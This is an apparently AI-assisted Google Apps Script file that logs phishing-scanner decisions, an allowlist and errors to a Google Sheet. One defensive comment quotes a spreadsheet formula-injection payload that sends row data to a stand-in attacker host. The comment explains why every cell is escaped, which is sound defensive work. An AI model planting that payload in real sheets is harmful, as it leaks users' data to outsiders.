/**
 * Logger.gs — the Google Sheet audit trail.
 *
 * Everything the script decides lands here, one row per message, so accuracy
 * can be reviewed before enforcement is ever switched on.
 *
 * Hard rule 3: at most the first 200 characters of a body ever reach this
 * sheet. Full bodies are never persisted anywhere.
 *
 * Naming note — Apps Script already has a built-in global called `Logger`
 * (Logger.log). This FILE is named Logger.gs, which is fine: Apps Script file
 * names are just labels, and every file shares one global scope. We must
 * simply never declare a variable or function named `Logger` in here, or we
 * would shadow the built-in.
 */

/** Tab names. */
var TAB = {
  DECISIONS: 'Decisions',
  ALLOWLIST: 'Config-Allowlist',
  ERRORS: 'Errors'
};

/**
 * The Decisions header row, defined ONCE.
 *
 * logDecision_() builds its row in exactly this order, and reads resolve their
 * column by name via decisionColumn_() rather than a bare index literal — so
 * inserting a column later cannot silently break dedupe into logging
 * duplicates forever.
 *
 * The spec asked for ten columns. Four more are here because widening a
 * populated sheet later is painful and each of these is needed by a later
 * stage:
 *   Message Date — Timestamp is when the ROW WAS WRITTEN (up to 20 minutes
 *                  after arrival, and different on a re-run). Every question
 *                  you will actually ask this log wants the message's own date.
 *   Reply-To     — sender/reply-to mismatch is a top-tier phishing signal, and
 *                  it is already in the payload. Stored as '' when it matches
 *                  the sender, so a populated cell MEANS mismatch.
 *   URL Count    — makes Stage 3 prompt-tuning debuggable ("why was this called
 *                  safe — oh, zero URLs were extracted").
 *   Review       — Stage 6 reads this column for the word WRONG to compute
 *                  precision. Last, so it is where the cursor lands.
 */
var DECISION_HEADERS = [
  'Timestamp',      // when this row was written
  'Message ID',     // GmailMessage.getId() — the dedupe key
  'Message Date',   // when the mail actually arrived
  'Sender',         // raw From header, display name included
  'Reply-To',       // '' when identical to the sender
  'Subject',
  'Body Preview',   // first 200 chars, newlines collapsed (hard rule 3)
  'URL Count',
  'Verdict',
  'Confidence',
  'Reasons',
  'Action Taken',
  'Error',
  'Review'          // you type WRONG here; Stage 6 reads it
];

var ALLOWLIST_HEADERS = ['Entry', 'Notes'];

var ERROR_HEADERS = ['Timestamp', 'Where', 'Message ID', 'Error', 'Stack'];

/**
 * Run-scoped caches.
 *
 * Apps Script note — globals are re-initialized on EVERY execution. There is no
 * long-lived process between runs. So these are automatically per-run caches
 * with zero invalidation logic to get wrong: fresh data each run, one read per
 * run. That is exactly the lifetime we want.
 */
var SS_CACHE_ = null;         // Spreadsheet handle
var PROCESSED_CACHE_ = null;  // {messageId: true}
var ALLOWLIST_CACHE_ = null;  // string[]

/**
 * True while THIS execution holds the script lock.
 *
 * Apps Script locks are NOT reentrant: if an execution that already holds the
 * script lock asks for it again, it blocks until the timeout and then throws.
 * scanInbox() takes the lock for the whole run, so the first-run spreadsheet
 * creation inside getLogSpreadsheet_() must not take it a second time. This
 * flag is how the two agree.
 */
var HOLDS_SCRIPT_LOCK_ = false;

/** Longest string we will put in any single cell (the hard cap is 50,000). */
var MAX_CELL_CHARS = 4000;

// ---------------------------------------------------------------------------
// Spreadsheet resolution
// ---------------------------------------------------------------------------

/**
 * Run this from the "Run" dropdown. Creates the log spreadsheet if it does not
 * exist yet, then prints its ID and URL.
 *
 * This exists so the first creation is a deliberate, observable act rather than
 * a side effect buried inside scanInbox() — and so you get the URL instead of
 * hunting through Drive for a file you did not know was made.
 */
function initLogSheet() {
  var ss = getLogSpreadsheet_();
  Logger.log('Log spreadsheet ready.');
  Logger.log('  Name: ' + ss.getName());
  Logger.log('  ID:   ' + ss.getId());
  Logger.log('  URL:  ' + ss.getUrl());
  Logger.log('Tabs: ' + ss.getSheets().map(function (s) { return s.getName(); }).join(', '));
}

/**
 * Resolves the log spreadsheet, creating it on first run.
 *
 * Precedence: CONFIG.LOG_SHEET_ID -> Script Property -> create a new one.
 *
 * @return {Spreadsheet}
 * @throws {Error} If a configured ID exists but cannot be opened.
 */
function getLogSpreadsheet_() {
  if (SS_CACHE_) return SS_CACHE_;

  var props = PropertiesService.getScriptProperties();
  var id = (CONFIG.LOG_SHEET_ID && CONFIG.LOG_SHEET_ID.trim()) ||
           props.getProperty(PROP.LOG_SHEET_ID) || '';
  id = id.trim();

  var ss;
  if (id) {
    try {
      // openById is a network call, which is why we cache the handle.
      ss = SpreadsheetApp.openById(id);
    } catch (err) {
      // Deliberately NOT falling through to create a replacement. Doing so
      // would orphan the entire decision history AND reset dedupe, so the very
      // next run would re-process every message in the window — a duplicate
      // row in Stage 1, a second PAID API call per message in Stage 2, and
      // re-taken actions on real mail in Stage 4. Fail loudly instead.
      throw new Error(
        'Could not open the log spreadsheet with ID "' + id + '".\n' +
        'It was probably deleted, or the stored ID is wrong.\n' +
        'Fix, whichever applies:\n' +
        '  - To point at an existing sheet: Project Settings -> Script ' +
        'Properties -> set LOG_SHEET_ID to the ID from its URL.\n' +
        '  - To start a fresh log: DELETE the LOG_SHEET_ID script property, ' +
        'then run initLogSheet().\n' +
        'Underlying error: ' + err.message
      );
    }
  } else if (HOLDS_SCRIPT_LOCK_) {
    // scanInbox() already holds the script lock for this whole run, and Apps
    // Script locks are not reentrant — asking again would block until timeout
    // and then throw. We are already protected, so just do the work.
    ss = createAndRememberLogSpreadsheet_(props);
  } else {
    // First run from initLogSheet(), which holds no lock of its own. Take one:
    // a manual editor run and the Stage 3 time trigger can overlap, and
    // without this you get TWO spreadsheets with one of them silently winning
    // the property. LockService is an Apps Script internal service and needs
    // no OAuth scope.
    var lock = LockService.getScriptLock();
    lock.waitLock(30000);
    try {
      ss = createAndRememberLogSpreadsheet_(props);
    } finally {
      lock.releaseLock();
    }
  }

  // Idempotent — also repairs a tab the user deleted by hand, and builds the
  // three tabs inside a spreadsheet you created manually as the fallback.
  ensureTab_(ss, TAB.DECISIONS, DECISION_HEADERS);
  ensureTab_(ss, TAB.ALLOWLIST, ALLOWLIST_HEADERS);
  ensureTab_(ss, TAB.ERRORS, ERROR_HEADERS);

  SS_CACHE_ = ss;
  return ss;
}

/**
 * Creates the log spreadsheet and remembers its ID — or opens the one a
 * concurrent run created while we were waiting for the lock.
 *
 * Only call this while the script lock is held; getLogSpreadsheet_() is
 * responsible for that.
 *
 * @param {Properties} props
 * @return {Spreadsheet}
 */
function createAndRememberLogSpreadsheet_(props) {
  // Double-checked: a concurrent run may have created it while we waited.
  var idNow = (props.getProperty(PROP.LOG_SHEET_ID) || '').trim();
  if (idNow) return SpreadsheetApp.openById(idNow);

  var ss = createLogSpreadsheet_();
  props.setProperty(PROP.LOG_SHEET_ID, ss.getId());
  Logger.log('Created log spreadsheet: ' + ss.getUrl());
  return ss;
}

/**
 * Creates the spreadsheet.
 *
 * Scope note — SpreadsheetApp.create() is authorized by the `spreadsheets`
 * scope we already declare. It does NOT need a Drive scope, so adding this
 * caused no manifest change and no re-consent prompt.
 *
 * Two consequences of having no Drive scope, worth knowing now:
 *   - The file is created in the ROOT of My Drive and this script cannot move
 *     it into a folder. Drag it wherever you like in the Drive UI.
 *   - This script cannot share it. Stage 5's "a family member can read the
 *     log" story is a manual share from the Sheets UI.
 *
 * @return {Spreadsheet}
 */
function createLogSpreadsheet_() {
  // Session.getScriptTimeZone() needs no scope — unlike Session.getActiveUser(),
  // which would drag userinfo.email into the manifest and force re-consent.
  var stamp = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), 'yyyy-MM-dd');
  var ss = SpreadsheetApp.create(CONFIG.LOG_SHEET_NAME + ' (' + stamp + ')');

  // create() hands back a spreadsheet containing one sheet named "Sheet1".
  // Rename it rather than inserting a fourth tab and leaving Sheet1 behind.
  ss.getSheets()[0].setName(TAB.DECISIONS);

  return ss;
}

/**
 * Creates a tab with a frozen, bold header row if it is missing. Idempotent.
 *
 * @param {Spreadsheet} ss
 * @param {string} name
 * @param {string[]} headers
 * @return {Sheet}
 */
function ensureTab_(ss, name, headers) {
  var sheet = ss.getSheetByName(name);
  var isNew = false;
  if (!sheet) {
    sheet = ss.insertSheet(name);
    isNew = true;
  }

  // A tab that exists but is empty (the renamed Sheet1) still needs headers.
  if (isNew || sheet.getLastRow() === 0) {
    sheet.getRange(1, 1, 1, headers.length).setValues([headers]).setFontWeight('bold');
    sheet.setFrozenRows(1);

    if (name === TAB.DECISIONS) {
      sheet.setColumnWidth(decisionColumn_('Sender'), 240);
      sheet.setColumnWidth(decisionColumn_('Subject'), 280);
      sheet.setColumnWidth(decisionColumn_('Body Preview'), 380);
      sheet.setColumnWidth(decisionColumn_('Reasons'), 300);
    }

    if (name === TAB.ALLOWLIST) {
      // Seed the guidance where the person maintaining this will actually read
      // it. They are not the person who read the design notes.
      sheet.getRange(2, 1, 1, 2).setValues([[
        '# One email or domain per row. Lines starting with # are ignored.',
        'An entry here means this sender is NEVER scanned. Sender addresses ' +
        'can be forged, so prefer exact addresses over whole domains.'
      ]]);
      sheet.setColumnWidth(1, 260);
      sheet.setColumnWidth(2, 480);
    }
  }

  return sheet;
}

/**
 * 1-based column index of a Decisions header, by name.
 * @param {string} headerName
 * @return {number}
 */
function decisionColumn_(headerName) {
  var i = DECISION_HEADERS.indexOf(headerName);
  if (i < 0) throw new Error('Unknown Decisions column: ' + headerName);
  return i + 1;
}

// ---------------------------------------------------------------------------
// Writing
// ---------------------------------------------------------------------------

/**
 * Makes a string safe to put in a spreadsheet cell.
 *
 * WHY THIS EXISTS. Every string we write here is attacker-controlled: the
 * subject line, the sender's display name, and the body preview all come
 * straight out of a hostile email. Google Sheets treats a value beginning with
 * = + - @ as a FORMULA. So a subject line of
 *
 *   =HYPERLINK("http://attacker.example/"&ENCODEURL(A2:N2),"Open me")
 *
 * would become a live, clickable formula inside the very sheet whose purpose
 * is to be a safe place to review dangerous mail — able to leak the row it sits
 * in, or fetch a remote URL the moment the sheet is opened. That is formula
 * injection, and a phishing log is close to an ideal target for it.
 *
 * A leading apostrophe is Sheets' "this is text, not a formula" marker. It is a
 * formatting flag, not part of the value: it is not displayed in the cell, and
 * getValue()/getValues() return the string without it. We apply it to every
 * text field, not just the dangerous ones, which also stops a subject like
 * "3/4" from silently becoming a date and a long digit string from becoming
 * scientific notation.
 *
 * @param {*} value
 * @return {string}
 */
function sanitizeForSheet_(value) {
  if (value === null || value === undefined) return '';
  var s = String(value);
  if (!s) return '';
  if (s.length > MAX_CELL_CHARS) s = s.slice(0, MAX_CELL_CHARS) + '…[truncated]';
  return "'" + s;
}

/**
 * Appends one row to the Decisions tab.
 *
 * Takes ONE object rather than fourteen positional arguments — fourteen
 * positional strings is a bug factory, and two of them would eventually get
 * transposed with nobody noticing.
 *
 * @param {{messageId: string, messageDate: Date, sender: string,
 *          replyTo: string, subject: string, bodyPreview: string,
 *          urlCount: number, verdict: string, confidence: (number|string),
 *          reasons: (string|string[]), actionTaken: string, error: string}} record
 */
function logDecision_(record) {
  var sheet = getLogSpreadsheet_().getSheetByName(TAB.DECISIONS);

  var reasons = record.reasons;
  if (Object.prototype.toString.call(reasons) === '[object Array]') {
    reasons = reasons.join(' | ');
  }

  // Built in DECISION_HEADERS order. Keep these comments aligned with it.
  var row = [
    new Date(),                                   // Timestamp
    sanitizeForSheet_(record.messageId),          // Message ID
    record.messageDate || '',                     // Message Date (a real Date)
    sanitizeForSheet_(record.sender),             // Sender
    sanitizeForSheet_(record.replyTo),            // Reply-To
    sanitizeForSheet_(record.subject),            // Subject
    sanitizeForSheet_(record.bodyPreview),        // Body Preview
    (record.urlCount === undefined ? '' : record.urlCount), // URL Count
    sanitizeForSheet_(record.verdict),            // Verdict
    (record.confidence === undefined || record.confidence === null ||
      record.confidence === '' ? '' : record.confidence),   // Confidence
    sanitizeForSheet_(reasons),                   // Reasons
    sanitizeForSheet_(record.actionTaken),        // Action Taken
    sanitizeForSheet_(record.error),              // Error
    ''                                            // Review — for you to fill in
  ];

  sheet.appendRow(row);

  // Keep the in-run dedupe cache honest, so a second pass inside the SAME run
  // cannot log the same message twice.
  markProcessedInMemory_(record.messageId);
}

/**
 * Appends one row to the Errors tab.
 *
 * MUST NOT THROW. This is the last line of defense for hard rule 4: an error
 * logger that can itself fail would turn one malformed message into a
 * whole-run abort, which is precisely the failure mode fail-safe exists to
 * prevent. Every path here falls back to the execution log.
 *
 * @param {string} where     Short label for the call site, e.g. 'scanInbox'.
 * @param {Error|string} err
 * @param {string=} messageId
 */
function logError_(where, err, messageId) {
  var message = String((err && err.message) || err || 'unknown error');
  try {
    var sheet = getLogSpreadsheet_().getSheetByName(TAB.ERRORS);
    var stack = String((err && err.stack) || '').slice(0, 1000);
    sheet.appendRow([
      new Date(),
      sanitizeForSheet_(where),
      sanitizeForSheet_(messageId || ''),
      sanitizeForSheet_(message),
      sanitizeForSheet_(stack)
    ]);
  } catch (loggingErr) {
    Logger.log('logError_ could not write to the sheet: ' + loggingErr.message);
  }
  // Always mirror to the execution log, so Stackdriver has it even if the
  // sheet write succeeded.
  Logger.log('ERROR [' + where + '] ' + (messageId ? '(' + messageId + ') ' : '') + message);
}

// ---------------------------------------------------------------------------
// Reading
// ---------------------------------------------------------------------------

/**
 * Strips the leading text-marker apostrophe if one survives a read.
 * getValues() normally returns the value without it; this is cheap insurance
 * for rows a human pasted in by hand.
 *
 * @param {*} value
 * @return {string}
 */
function unmarkCell_(value) {
  var s = String(value === null || value === undefined ? '' : value).trim();
  return s.charAt(0) === "'" ? s.slice(1) : s;
}

/**
 * The allowlist, normalized and cached for this run.
 *
 * Normalization: trimmed, lowercased, blanks dropped, '#' comment rows dropped,
 * a leading '@' stripped so "@example.com" and "example.com" mean the same
 * thing.
 *
 * @return {string[]}
 */
function getAllowlist_() {
  if (ALLOWLIST_CACHE_) return ALLOWLIST_CACHE_;

  var sheet = getLogSpreadsheet_().getSheetByName(TAB.ALLOWLIST);
  var lastRow = sheet.getLastRow();

  // getRange() with zero rows THROWS, and an empty tab is the first-run state.
  // This guard is the single most likely first-run crash if you forget it.
  if (lastRow < 2) {
    ALLOWLIST_CACHE_ = [];
    return ALLOWLIST_CACHE_;
  }

  var values = sheet.getRange(2, 1, lastRow - 1, 1).getValues();
  var out = [];
  for (var i = 0; i < values.length; i++) {
    var entry = unmarkCell_(values[i][0]).toLowerCase();
    if (!entry) continue;
    if (entry.charAt(0) === '#') continue;
    if (entry.charAt(0) === '@') entry = entry.slice(1);
    if (entry) out.push(entry);
  }

  ALLOWLIST_CACHE_ = out;
  return out;
}

/**
 * Is this sender allowlisted? Hard rule 6: allowlisted senders are never
 * scanned, no matter what.
 *
 * Entry forms (already normalized by getAllowlist_):
 *   alice@example.com   contains '@'  -> exact address match
 *   example.com         no '@'        -> domain match
 *
 * @param {string} address Lowercased address from extractEmailAddress_().
 * @return {boolean}
 */
function isAllowlisted_(address) {
  if (!address) return false;
  var addr = address.toLowerCase();

  // Take the LAST '@' — the domain is what follows it.
  var at = addr.lastIndexOf('@');
  var domain = at >= 0 ? addr.slice(at + 1) : '';

  var list = getAllowlist_();
  for (var i = 0; i < list.length; i++) {
    var entry = list[i];

    if (entry.indexOf('@') >= 0) {
      if (addr === entry) return true;
      continue;
    }

    if (domain === entry) return true;

    // Subdomain matching, off by default. NOTE the mandatory '.' + entry: a
    // naive domain.endsWith(entry) would make "evilchase.com" match an entry
    // of "chase.com". That is the classic suffix bug and it is a free
    // allowlist bypass.
    if (CONFIG.ALLOWLIST_MATCH_SUBDOMAINS && domain.length > entry.length &&
        domain.slice(-(entry.length + 1)) === '.' + entry) {
      return true;
    }
  }
  return false;
}

/**
 * Loads recently-logged message IDs into an in-memory map, once per run.
 *
 * One batched getRange().getValues() — never a read per message. Each Sheets
 * round trip costs 100-300ms, so a per-message read would dominate the run.
 *
 * Reads only the TAIL of the log. That is provably safe rather than a guess: a
 * message can only be re-encountered while it still matches the search, which
 * means it arrived within the last POLL_WINDOW_MINUTES. So anything we could
 * possibly double-log was written in the last ~20 minutes — at most ~20 rows at
 * the maximum rate. DEDUPE_LOOKBACK_ROWS is a ~100x margin on that, and it
 * keeps this read O(1) as the log grows forever.
 *
 * @return {Object} {messageId: true}
 */
function loadProcessedIds_() {
  if (PROCESSED_CACHE_) return PROCESSED_CACHE_;

  var cache = {};
  var sheet = getLogSpreadsheet_().getSheetByName(TAB.DECISIONS);
  var lastRow = sheet.getLastRow();

  if (lastRow < 2) {           // headers only — nothing logged yet
    PROCESSED_CACHE_ = cache;
    return cache;
  }

  var startRow = Math.max(2, lastRow - CONFIG.DEDUPE_LOOKBACK_ROWS + 1);
  var numRows = lastRow - startRow + 1;
  var col = decisionColumn_('Message ID');   // by name, never a bare literal
  var values = sheet.getRange(startRow, col, numRows, 1).getValues();

  for (var i = 0; i < values.length; i++) {
    var id = unmarkCell_(values[i][0]);
    if (id) cache[id] = true;
  }

  PROCESSED_CACHE_ = cache;
  return cache;
}

/**
 * Has this message already been logged? Pure lookup — no Sheet I/O.
 *
 * @param {string} messageId
 * @return {boolean}
 */
function isProcessed_(messageId) {
  if (!messageId) return false;
  return loadProcessedIds_()[messageId] === true;
}

/**
 * Records an ID in the run cache without touching the sheet.
 * @param {string} messageId
 */
function markProcessedInMemory_(messageId) {
  if (!messageId) return;
  loadProcessedIds_()[messageId] = true;
}

/**
 * Reads Errors rows written at or after `sinceMs`.
 *
 * Used by the daily self-test (did anything break today?) and by the Stage 4
 * kill switch (are we failing so often that enforcement should stop?).
 *
 * Scans from the END backwards and stops at the first row older than the
 * cutoff, because the Errors tab is append-only and chronological. That keeps
 * this O(matching rows) rather than O(whole log).
 *
 * @param {number} sinceMs
 * @return {Array<{when: Date, where: string, messageId: string, error: string}>}
 *         Oldest first.
 */
function getErrorsSince_(sinceMs) {
  var sheet = getLogSpreadsheet_().getSheetByName(TAB.ERRORS);
  var lastRow = sheet.getLastRow();
  if (lastRow < 2) return [];

  // Cap how far back we are willing to look, so a huge Errors tab cannot make
  // a trigger run long.
  var earliest = Math.max(2, lastRow - CONFIG.DEDUPE_LOOKBACK_ROWS + 1);
  var values = sheet.getRange(earliest, 1, lastRow - earliest + 1, ERROR_HEADERS.length).getValues();

  var out = [];
  for (var i = values.length - 1; i >= 0; i--) {
    var when = values[i][0];
    var t = (when instanceof Date) ? when.getTime() : Date.parse(when);
    if (!t || isNaN(t)) continue;
    if (t < sinceMs) break;
    out.unshift({
      when: new Date(t),
      where: unmarkCell_(values[i][1]),
      messageId: unmarkCell_(values[i][2]),
      error: unmarkCell_(values[i][3])
    });
  }
  return out;
}

/**
 * Reads Decisions rows whose Message Date is at or after `sinceMs`.
 * Used by the Stage 5 weekly digest and the Stage 6 summary.
 *
 * @param {number} sinceMs
 * @return {Object[]} Row objects keyed by DECISION_HEADERS name, oldest first.
 */
function getDecisionsSince_(sinceMs) {
  var sheet = getLogSpreadsheet_().getSheetByName(TAB.DECISIONS);
  var lastRow = sheet.getLastRow();
  if (lastRow < 2) return [];

  var values = sheet.getRange(2, 1, lastRow - 1, DECISION_HEADERS.length).getValues();
  var out = [];
  for (var i = 0; i < values.length; i++) {
    var when = values[i][DECISION_HEADERS.indexOf('Message Date')];
    var t = (when instanceof Date) ? when.getTime() : Date.parse(when);
    if (!t || isNaN(t) || t < sinceMs) continue;

    var row = {};
    for (var c = 0; c < DECISION_HEADERS.length; c++) {
      var v = values[i][c];
      row[DECISION_HEADERS[c]] = (v instanceof Date) ? v : unmarkCell_(v);
    }
    row._messageDate = new Date(t);
    out.push(row);
  }
  return out;
}

/**
 * Appends an address to the Config-Allowlist tab, if it is not already there.
 * Used by restoreMessage() so undoing a false positive also prevents a repeat.
 *
 * @param {string} entry An email address or domain.
 * @param {string=} note Free text for the Notes column.
 * @return {boolean} true if it was added, false if already present.
 */
function addToAllowlist_(entry, note) {
  var normalized = String(entry || '').trim().toLowerCase();
  if (!normalized) return false;
  if (normalized.charAt(0) === '@') normalized = normalized.slice(1);

  var list = getAllowlist_();
  for (var i = 0; i < list.length; i++) {
    if (list[i] === normalized) return false;
  }

  getLogSpreadsheet_().getSheetByName(TAB.ALLOWLIST)
    .appendRow([sanitizeForSheet_(normalized), sanitizeForSheet_(note || '')]);

  // Keep the run cache consistent so a later call in the same run sees it.
  list.push(normalized);
  return true;
}
